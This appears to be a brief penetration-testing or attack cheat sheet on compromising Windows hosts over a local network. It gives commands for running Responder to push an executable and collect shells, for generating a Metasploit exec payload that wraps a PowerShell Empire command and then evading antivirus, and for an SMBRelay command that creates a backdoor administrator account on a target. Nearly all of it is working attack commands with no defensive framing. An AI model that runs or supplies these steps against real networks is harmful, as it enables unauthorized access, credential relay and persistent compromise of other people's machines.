Quick setup and run
This is for a really noisy one that would work for majority of people 
in open networks that would run an exe.

Add executable you want target to run and drop in 
    files/meter.exe

Then run 
    python Responder.py -I wlan0 -rw

Then wait for shells


Generate payload

metasploit
use payload/windows/exec
set CMD="powershell command for Empire"
generate -t c -f /tmp/header.c

Then use your AV Bypass tech of choice to get it to run on target.



SMBRelay.py Notes

To do SMBRelay turn off SMB module in Responder

python SMBRelay.py -i 192.168.1.10 -c 'net user Test password! /add &&net localgroup administrators Test /add' -t <ipaddress of target> -u Administrator otheraccount

and then wait
